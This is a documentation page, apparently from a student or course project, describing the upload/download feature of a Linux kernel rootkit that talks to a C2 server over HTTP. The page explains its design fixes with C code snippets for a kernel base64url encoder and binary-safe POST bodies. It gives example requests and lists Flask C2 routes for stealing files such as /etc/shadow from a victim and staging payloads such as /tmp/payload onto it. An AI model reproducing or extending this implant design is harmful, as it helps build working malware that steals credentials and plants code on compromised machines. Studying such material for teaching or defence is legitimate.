---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Upload / Download"
  description="Bidirectional file transfer between the attacker and the victim, implemented entirely from kernel space over HTTP."
  badge="Optional"
  points="3 pts"
  slug="upload-download"
  prev={{ href: "/features/exec", label: "Execute Commands" }}
  next={{ href: "/features/reverse-shell", label: "Reverse Shell" }}
>

<section class="section">
  <h2 class="section-title">// Context</h2>
  <div class="prose">
    <p>
      The upload/download feature allows the attacker to retrieve any file from the victim
      (e.g. <code>/etc/shadow</code>) and push arbitrary files to it (e.g. a payload binary).
      Everything goes through the existing HTTP channel, with no additional port or protocol.
    </p>
    <p>
      Implementing this from a kernel module raised two hard problems that did not exist for
      the simple command execution feature: how to send <strong>binary file content</strong>
      through an HTTP layer built on C strings, and how to include an <strong>arbitrary file path</strong>
      in a URL without breaking routing.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// The initial approach and its problems</h2>

  <h3 class="sub-h3">First design: single endpoint with X-Filename header</h3>
  <div class="prose">
    <p>
      The first implementation used a single route <code>/api/&lt;uuid&gt;/file</code> for all
      file transfers. The target path was passed as a custom HTTP header
      <code>X-Filename: /etc/shadow</code> in the request.
    </p>
    <p>
      To send this header, two new HTTP helper functions were written from scratch in the
      kernel module , one for upload, one for download , duplicating code that already
      existed for the command polling and result posting.
    </p>
  </div>

  <div class="fail-box">
    <div class="fail-title">Problem 1: code duplication</div>
    <pre><code>{`// Two new functions, essentially reimplementing http_get() and http_post()
// just to add one extra header , all the socket/connect/send logic duplicated
static int http_get_file(const char *host, const char *uuid, char *out, size_t *out_len);
static int http_post_file(const char *host, const char *uuid,
                          const char *filename, const char *buf, size_t len);`}</code></pre>
  </div>

  <div class="fail-box">
    <div class="fail-title">Problem 2: race condition</div>
    <pre><code>{`// If two files are staged quickly, the rootkit always hits /api/<uuid>/file
// and picks up "the next file" , whichever the server decides to return.
// If a second upload is queued before the first is consumed,
// the rootkit may fetch them in the wrong order, or skip one entirely.
GET /api/<uuid>/file   ← which file? depends on server-side queue state`}</code></pre>
  </div>

  <h3 class="sub-h3">The fix: embed the path in the URL</h3>
  <div class="prose">
    <p>
      We redesigned the endpoint to embed the file path directly in the URL as
      <code>/api/&lt;uuid&gt;/file/&lt;path&gt;</code>. This way:
    </p>
    <ul>
      <li>The existing <code>http_get()</code> and <code>http_post()</code> functions can be reused as-is , no duplication.</li>
      <li>Each file gets its own unique URL, so the rootkit fetches exactly the right file with no ambiguity.</li>
      <li>Race conditions disappear: two concurrent uploads have two distinct URLs.</li>
    </ul>
    <p>
      The immediate follow-up question was: file paths contain <code>/</code> characters,
      which would break URL routing. The suggestion was to encode the path , specifically
      with <strong>URL-safe base64</strong>.
    </p>
    <p>
      Regular percent-encoding (<code>%2F</code> for <code>/</code>) does not work here:
      Flask automatically decodes <code>%2F</code> back to <code>/</code> before route matching,
      so the path still gets split. Standard base64 does not work either since it uses
      <code>+</code> (interpreted as a space in URLs) and <code>/</code> (path separator).
      URL-safe base64 replaces both with <code>-</code> and <code>_</code>, producing a string
      that Flask routes as a single opaque segment.
    </p>
  </div>

  <div class="code-block">
    <div class="code-header"><span>Example encoding</span></div>
    <pre><code>{`/etc/shadow  →  base64url  →  L2V0Yy9zaGFkb3c
/tmp/payload →  base64url  →  L3RtcC9wYXlsb2Fk

// Download: rootkit POSTs the file content to its own unique URL
POST /api/<uuid>/file/L2V0Yy9zaGFkb3c
// Upload: rootkit GETs the staged file from its own unique URL
GET  /api/<uuid>/file/L3RtcC9wYXlsb2Fk`}</code></pre>
  </div>

  <div class="callout">
    <span class="callout-icon">💡</span>
    <p>On the C2 side, Flask decodes with <code>base64.urlsafe_b64decode(path_b64 + '==')</code>. The <code>==</code> padding is re-added before decoding since standard Python base64 requires it, even though we strip it on the kernel side to keep URLs clean.</p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Problem 3: binary content and NUL bytes</h2>

  <div class="prose">
    <p>
      A separate issue arose when testing with binary files. The HTTP POST helper
      originally used <code>strlen()</code> to compute the body length. This works for
      text payloads (stdout, stderr) but silently truncates binary files at the first
      NUL byte (<code>0x00</code>). An ELF binary starts with
      <code>7f 45 4c 46 00 02…</code> , it would be sent as a 4-byte payload.
    </p>
  </div>

  <div class="fail-box">
    <div class="fail-title">Broken: strlen on binary content</div>
    <pre><code>{`// strlen("/etc/shadow content") works fine for text
// strlen(elf_binary) → 4  (stops at the first 0x00)
size_t body_len = strlen(file_buf);   // WRONG for binary
http_post(url, file_buf, body_len);   // sends only 4 bytes of an ELF`}</code></pre>
  </div>

  <div class="prose">
    <p>
      The fix was to pass the length returned by <code>read_file()</code> directly,
      and replace all string functions in the HTTP body construction with
      <code>memcpy</code>. The <code>Content-Length</code> header is now built from
      the real byte count, not a string measurement.
    </p>
  </div>

  <div class="code-block">
    <div class="code-header"><span>Fixed: explicit length from read_file()</span><span class="lang">C</span></div>
    <pre><code>{`ssize_t file_len = read_file(path, file_buf, FILE_BUF_SIZE);
if (file_len < 0) return file_len;

// file_len is the real byte count , memcpy used internally, not strcpy
http_post_binary(url, file_buf, (size_t)file_len);`}</code></pre>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Base64 implementation in the kernel</h2>
  <div class="prose">
    <p>
      The Linux kernel does not expose a URL-safe base64 encoder in its public API.
      We based our implementation on the open-source C library by
      <strong>Ahmad Elzoughby</strong>:
      <a href="https://github.com/elzoughby/Base64/blob/master/base64.c" target="_blank" rel="noopener">
        github.com/elzoughby/Base64
      </a>.
      We adapted it to use the URL-safe alphabet (<code>-</code> and <code>_</code> instead of
      <code>+</code> and <code>/</code>), removed padding, and replaced all heap allocations
      with kernel-safe equivalents (<code>kmalloc</code> / <code>kfree</code>,
      <code>GFP_KERNEL</code> flag).
    </p>
  </div>
  <div class="code-block">
    <div class="code-header"><span>rootkit/src/c2.c , b64url_encode()</span><span class="lang">C</span></div>
    <pre><code>{`// URL-safe alphabet: - and _ instead of + and /, no = padding
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static int b64url_encode(const u8 *in, size_t in_len,
                          char *out, size_t out_max)
{
    size_t i = 0, o = 0;
    while (i < in_len && o + 4 < out_max) {
        u32 v = (in[i] << 16)
              | (i+1 < in_len ? in[i+1] << 8 : 0)
              | (i+2 < in_len ? in[i+2]      : 0);
        out[o++] = b64_table[(v >> 18) & 0x3f];
        out[o++] = b64_table[(v >> 12) & 0x3f];
        if (i + 1 < in_len) out[o++] = b64_table[(v >> 6) & 0x3f];
        if (i + 2 < in_len) out[o++] = b64_table[ v       & 0x3f];
        i += 3;
    }
    out[o] = '\\0';
    return (int)o;
}`}</code></pre>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Download flow (victim to attacker)</h2>
  <div class="prose">
    <p>The operator sends <code>download:/etc/shadow</code> from the dashboard. The rootkit reads the file and POSTs its raw bytes to the C2.</p>
  </div>
  <div class="diagram">
    <svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <text x="100" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">C2 Operator</text>
      <text x="360" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">C2 Server</text>
      <text x="620" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">Rootkit</text>
      <line x1="100" y1="35" x2="100" y2="270" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="360" y1="35" x2="360" y2="270" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="620" y1="35" x2="620" y2="270" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <defs>
        <marker id="a"  markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
        <marker id="ay" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#e3b341"/></marker>
      </defs>
      <line x1="100" y1="60" x2="345" y2="60" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>
      <text x="225" y="53" text-anchor="middle" fill="#8b949e" font-size="10">POST /action , download:/etc/shadow</text>
      <line x1="360" y1="85" x2="605" y2="85" stroke="#e3b341" stroke-width="1.5" marker-end="url(#ay)"/>
      <text x="490" y="78" text-anchor="middle" fill="#8b949e" font-size="10">200 , download:/etc/shadow (next poll)</text>
      <rect x="550" y="95" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="620" y="109" text-anchor="middle" fill="#8b949e" font-size="10">read_file("/etc/shadow", buf, len)</text>
      <rect x="550" y="120" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="620" y="134" text-anchor="middle" fill="#8b949e" font-size="10">b64url_encode(path) → "L2V0Yy9zaGFkb3c"</text>
      <line x1="620" y1="155" x2="375" y2="155" stroke="#00ff41" stroke-width="1.5" marker-end="url(#a)"/>
      <text x="495" y="148" text-anchor="middle" fill="#8b949e" font-size="10">POST /api/&lt;uuid&gt;/file/L2V0Yy9zaGFkb3c</text>
      <text x="495" y="162" text-anchor="middle" fill="#8b949e" font-size="9">[binary body, explicit Content-Length]</text>
      <rect x="290" y="172" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="360" y="186" text-anchor="middle" fill="#8b949e" font-size="10">save to downloads/&lt;uuid&gt;/</text>
      <line x1="360" y1="210" x2="115" y2="210" stroke="#e3b341" stroke-width="1.5" marker-end="url(#ay)"/>
      <text x="235" y="203" text-anchor="middle" fill="#8b949e" font-size="10">GET /download/&lt;uuid&gt;/&lt;id&gt; → file attachment</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Upload flow (attacker to victim)</h2>
  <div class="prose">
    <p>The operator selects a local file and provides a destination path on the victim. The file is staged on the C2, then served to the rootkit on its next poll cycle.</p>
  </div>
  <div class="diagram">
    <svg viewBox="0 0 720 250" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <text x="100" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">C2 Operator</text>
      <text x="360" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">C2 Server</text>
      <text x="620" y="28" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">Rootkit</text>
      <line x1="100" y1="35" x2="100" y2="245" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="360" y1="35" x2="360" y2="245" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <line x1="620" y1="35" x2="620" y2="245" stroke="#30363d" stroke-width="1.5" stroke-dasharray="4,3"/>
      <defs>
        <marker id="b"  markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
        <marker id="by" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#e3b341"/></marker>
      </defs>
      <line x1="100" y1="60" x2="345" y2="60" stroke="#00ff41" stroke-width="1.5" marker-end="url(#b)"/>
      <text x="225" y="53" text-anchor="middle" fill="#8b949e" font-size="10">POST /stage/&lt;uuid&gt; , file + dest path</text>
      <rect x="290" y="70" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="360" y="84" text-anchor="middle" fill="#8b949e" font-size="10">stage file, queue upload:&lt;dest&gt;</text>
      <line x1="360" y1="107" x2="605" y2="107" stroke="#e3b341" stroke-width="1.5" marker-end="url(#by)"/>
      <text x="490" y="100" text-anchor="middle" fill="#8b949e" font-size="10">200 , upload:/tmp/payload (next poll)</text>
      <rect x="550" y="117" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="620" y="131" text-anchor="middle" fill="#8b949e" font-size="10">b64url_encode("/tmp/payload")</text>
      <line x1="620" y1="152" x2="375" y2="152" stroke="#00ff41" stroke-width="1.5" marker-end="url(#b)"/>
      <text x="490" y="145" text-anchor="middle" fill="#8b949e" font-size="10">GET /api/&lt;uuid&gt;/file/L3RtcC9wYXlsb2Fk</text>
      <line x1="360" y1="170" x2="605" y2="170" stroke="#e3b341" stroke-width="1.5" marker-end="url(#by)"/>
      <text x="490" y="163" text-anchor="middle" fill="#8b949e" font-size="10">200 OK , [binary body, explicit length]</text>
      <rect x="550" y="180" width="140" height="20" rx="3" fill="#161b22" stroke="#30363d" stroke-width="1"/>
      <text x="620" y="194" text-anchor="middle" fill="#8b949e" font-size="10">write_file("/tmp/payload", buf, len)</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// C2 routes</h2>
  <div class="steps">
    <div class="step">
      <span class="step-num">01</span>
      <div class="step-body">
        <strong>POST /stage/&lt;uuid&gt;</strong>
        <p>Browser uploads a file and a destination path. The C2 saves the file locally and queues <code>upload:&lt;dest&gt;</code> for the rootkit's next poll.</p>
      </div>
    </div>
    <div class="step">
      <span class="step-num">02</span>
      <div class="step-body">
        <strong>GET /api/&lt;uuid&gt;/file/&lt;path_b64&gt;</strong>
        <p>Rootkit fetches a staged file. The C2 decodes the base64 path, finds the staged file, and returns it as a raw binary response.</p>
      </div>
    </div>
    <div class="step">
      <span class="step-num">03</span>
      <div class="step-body">
        <strong>POST /api/&lt;uuid&gt;/file/&lt;path_b64&gt;</strong>
        <p>Rootkit sends a file from the victim. The C2 decodes the path and saves the raw binary body to <code>downloads/&lt;uuid&gt;/</code>.</p>
      </div>
    </div>
    <div class="step">
      <span class="step-num">04</span>
      <div class="step-body">
        <strong>GET /download/&lt;uuid&gt;/&lt;transfer_id&gt;</strong>
        <p>Browser downloads a file previously received from the victim, served as an attachment with the original filename.</p>
      </div>
    </div>
  </div>
</section>

</FeaturePage>

<style>
.sub-h3 {
  font-size: 0.9em;
  color: var(--text);
  margin: 1.2em 0 0.6em;
}
.fail-box {
  border: 1px solid rgba(248,81,73,0.35);
  border-left: 3px solid rgba(248,81,73,0.6);
  border-radius: 8px;
  overflow: hidden;
  margin: 1em 0;
  background: #010409;
}
.fail-title {
  background: rgba(248,81,73,0.08);
  border-bottom: 1px solid rgba(248,81,73,0.2);
  padding: 0.4em 1em;
  font-family: 'Courier New', monospace;
  font-size: 0.78em;
  color: #f85149;
  letter-spacing: 0.5px;
}
.fail-box pre {
  margin: 0;
  padding: 1em 1.2em;
  overflow-x: auto;
}
.fail-box code {
  font-family: 'Courier New', monospace;
  font-size: 0.85em;
  color: #a5d6ff;
  line-height: 1.65;
}
</style>
